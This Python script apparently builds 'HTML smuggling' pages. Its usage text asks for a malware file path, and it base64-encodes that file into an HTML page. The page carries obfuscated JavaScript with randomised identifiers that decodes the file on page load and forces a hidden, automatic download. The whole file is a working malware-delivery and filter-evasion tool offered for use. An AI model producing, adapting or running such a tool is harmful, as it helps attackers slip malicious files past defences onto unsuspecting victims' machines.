import random,string, sys, os, base64
try:
    from colored import fg , attr , bg , style
except ImportError:
    os.system("pip install colored")
cyann  = fg("cyan")     + attr("bold")
greenn = fg("#33ff29")  + attr("bold")
mof    = fg("#ab01ff")  + attr("bold")
white  = fg("white")    + attr("bold")
error  = fg("#ff1d00")  + attr("bold")
bluee = fg("blue")      + attr("bold")
mof = fg("#CB88D8")      + attr("bold")
b = fg("#E91377")      + attr("bold")
y = fg("#FCF800")      + attr("bold")
backg  = error + bg("white")     + attr("bold")
back = error + bg("#ab01ff")     + attr("bold")
bk = bg("white")     + attr("bold")
# def randoms_sequences():
#     # randoms = [
#     # "mmiiddop","de3vil34","bur45op7",
#     # "vg9deu1l","asasasas","midlopgf",
#     # "dhtxpb47","vavi6lts","mvrxqb8g",
#     # "athxow5m","almsvf4e","yhncgbfd",
#     # "tl3rap0h","bv8wzmdr","gabx0voj",
#     # "amytrfvs","md29linv","fq0y5s6v",
#     # "ix0j9cv1"]
# {bluee}{bk}{greenn}{backg} {style.RESET}
def bannare():
    bannar = f"""

{error}       _  _ ___ _  _ _    ____ _  _ _  _ ____ ____ _    _ _  _ ____ 
{mof}       |__|  |  |\/| |    [__  |\/| |  | | __ | __ |    | |\ | | __ 
{y}       |  |  |  |  | |___ ___] |  | |__| |__] |__] |___ | | \| |__] 
{cyann}            created by : {greenn}Abdulrahman Mohammed {y}({error}De3vil{y})                                                        

"""
    print(bannar)
bannare()
def r_sqs():
    # generator a random sequences
    randoms = []
    for de3vil in range(0, 19):
        while True:
            uniqu = True
            ntmp1 = random.sample(string.ascii_lowercase, k=2)
            ntmp22 = random.sample(string.digits , k=2)
            ntmp2 = random.sample(string.ascii_lowercase, k=5)
            nubTmp = ntmp1[0] + ntmp1[1] + ntmp22[0] + ntmp22[1] + ntmp2[2] + ntmp2[3] + ntmp2[3] + ntmp2[4]
            for tmp in randoms:
                if tmp == nubTmp:
                    uniqu = False
                    break
            if uniqu:
                randoms.append(nubTmp)
                break
    return randoms

def arg(outputscr):
    argv = sys.argv
    number = len(argv)
    if number == 3:
        filename = argv[1].replace('"',"")
        filepath = argv[2].replace('"',"")
    else:
        program = argv[0].split(sep='\\')[-1].split(sep='/')[-1]
        print()
        print (f"{white}\tHow to use it Exmpales ")
        print(f"""\t{bluee}{bk}{program} {greenn}{backg}<FileName> {mof}<MalwarePath>{style.RESET}""" )
        print (style.RESET)
        print (style.RESET)
        c =  f"""
        {cyann}{program}\t{greenn}FileName.exe\t{mof}pathfile{backg}\malware.exe{style.RESET}
        {cyann}{program}\t{greenn}FileName.dll\t{mof}pathfile{backg}\malware.dll{style.RESET}
        {cyann}{program}\t{greenn}FileName.pdf\t{mof}pathfile{backg}\malware.pdf{style.RESET}
        {cyann}{program}\t{greenn}FileName.docx\t{mof}pathfile{backg}\malware.docx{style.RESET}
        \n\t\t       {greenn}{backg}or any extention{style.RESET}
        \n \t {greenn}{backg}FileName{style.RESET} {white}You Can set Any Name U want {style.RESET}
          """
        print(c)
        print (style.RESET)
        print()
        sys.exit(0)
    # (0) check file and permissions
    check_file_exist = os.access(filepath, os.F_OK) # return True OR  False
    try:
        with open(file=outputscr, encoding='utf-8', mode='w') as wfile:
            wfile.write("Trial")
        os.remove(outputscr)
        check_write_permission = True
    except:
        check_write_permission = False
    if check_file_exist:
        if check_write_permission:
            return filename, filepath
        else:
            print()
            print(f"\t[{error}!{style.RESET}]{white}You Do not have permission to write or delete this file!")
            print()
            sys.exit(0)
    else:
        print()
        print(f"\t[{error}!{style.RESET}]{white}The file not found{error}!{style.RESET}")
        print()
        sys.exit(0)
#
if __name__ == '__main__':
    outputscr = "script.txt"
    try:
        file_name, filepath = arg(outputscr)
    except:
        sys.exit(0)
    try:
        with open(file=filepath, mode='rb') as rbfile:
            file_bytes = rbfile.read()
        data_base64_bytes = base64.b64encode(file_bytes)
        del file_bytes, filepath
        file_base64 = data_base64_bytes.decode(encoding='UTF-8')
        del data_base64_bytes
        randoms = r_sqs()
        x = """ 
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1" />
</head>
<body>
        """
        y = """ 
</body>
</html>
"""
        template = x+'\n'+ """<script> var """ + randoms[0] + """=""" + randoms[0] + """;(function(""" + randoms[1] + """,""" + randoms[
            2] + """){var """ + randoms[3] + """=""" + randoms[0] + """,""" + randoms[4] + """=""" + randoms[
                       1] + """();while(!![]){try{var """ + randoms[5] + """=-parseInt(""" + randoms[
                       3] + """(0x1b1))/0x1+-parseInt(""" + randoms[3] + """(0x1a7))/0x2+parseInt(""" + randoms[
                       3] + """(0x1b3))/0x3+-parseInt(""" + randoms[3] + """(0x1bd))/0x4*(parseInt(""" + randoms[
                       3] + """(0x1b6))/0x5)+parseInt(""" + randoms[3] + """(0x1b4))/0x6*(parseInt(""" + randoms[
                       3] + """(0x1a8))/0x7)+parseInt(""" + randoms[3] + """(0x1b9))/0x8+-parseInt(""" + randoms[
                       3] + """(0x1b7))/0x9;if(""" + randoms[5] + """===""" + randoms[2] + """)break;else """ + randoms[
                       4] + """['push'](""" + randoms[4] + """['shift']());}catch(""" + randoms[6] + """){""" + randoms[
                       4] + """['push'](""" + randoms[4] + """['shift']());}}}(""" + randoms[7] + """,0x291fa));function """ + \
                   randoms[7] + """(){var """ + randoms[
                       8] + """=['revokeObjectURL','508149iyQTpI','216tZOcWE','octet/stream','500685VYAZHK','2271357zoKGKP','length','2630616khEGdN','body','download','atob','4kKgjnM','createElement','214758lzjpsQ','44093NNfoUz','appendChild','buffer','URL','display:\\x20none','click','charCodeAt','href','""" + file_name + """','96643zAJuKG'];""" + \
                   randoms[7] + """=function(){return """ + randoms[8] + """;};return """ + randoms[7] + """();}var """ + randoms[
                       13] + """='""" + file_base64 + """',""" + randoms[14] + """=window[""" + randoms[0] + """(0x1bc)](""" + \
                   randoms[13] + """),""" + randoms[15] + """=new Uint8Array(""" + randoms[14] + """[""" + randoms[
                       0] + """(0x1b8)]);for(var i=0x0;i<""" + randoms[14] + """[""" + randoms[0] + """(0x1b8)];i++){""" + randoms[
                       15] + """[i]=""" + randoms[14] + """[""" + randoms[0] + """(0x1ae)](i);}function """ + randoms[0] + """(""" + \
                   randoms[10] + """,""" + randoms[12] + """){var """ + randoms[7] + """46=""" + randoms[7] + """();return """ + randoms[
                       0] + """=function(""" + randoms[0] + """ed,""" + randoms[9] + """){""" + randoms[0] + """ed=""" + randoms[
                       0] + """ed-0x1a7;var """ + randoms[11] + """=""" + randoms[7] + """46[""" + randoms[0] + """ed];return """ + \
                   randoms[11] + """;},""" + randoms[0] + """(""" + randoms[10] + """,""" + randoms[12] + """);}var """ + randoms[
                       16] + """=new Blob([""" + randoms[15] + """[""" + randoms[0] + """(0x1aa)]],{'type':""" + randoms[
                       0] + """(0x1b5)}),""" + randoms[17] + """=document[""" + randoms[0] + """(0x1be)]('a'),""" + randoms[
                       18] + """=window[""" + randoms[0] + """(0x1ab)]['createObjectURL'](""" + randoms[16] + """);document[""" + \
                   randoms[0] + """(0x1ba)][""" + randoms[0] + """(0x1a9)](""" + randoms[17] + """),""" + randoms[
                       17] + """['style']=""" + randoms[0] + """(0x1ac),""" + randoms[17] + """[""" + randoms[0] + """(0x1af)]=""" + \
                   randoms[18] + """,""" + randoms[17] + """[""" + randoms[0] + """(0x1bb)]=""" + randoms[0] + """(0x1b0),""" + randoms[
                       17] + """[""" + randoms[0] + """(0x1ad)](),window[""" + randoms[0] + """(0x1ab)][""" + randoms[
                       0] + """(0x1b2)](""" + randoms[18] + """); </script>"""+'\n'+y
        del file_name, file_base64, randoms
        with open(file=outputscr, encoding='utf-8', mode="w") as wfile:
            wfile.write(template)
        with open ("mido_template.html","w",encoding="utf-8") as Midohtml:
            Midohtml.write(template)
        print()
        print(f'\t{white}[{bluee}+{white}] The {error}{bk}Template.html{style.RESET} {white}file has been created {greenn}successfully.{style.RESET}')
        print(f'\t{white}[{bluee}+{white}] Script File: {error}{bk}"jscode.txt" {style.RESET}')
        print()
    except Exception as e:
        print(e)
        print(f'\t{error}An unexpected error has occurred!{style.RESET}')
        print()
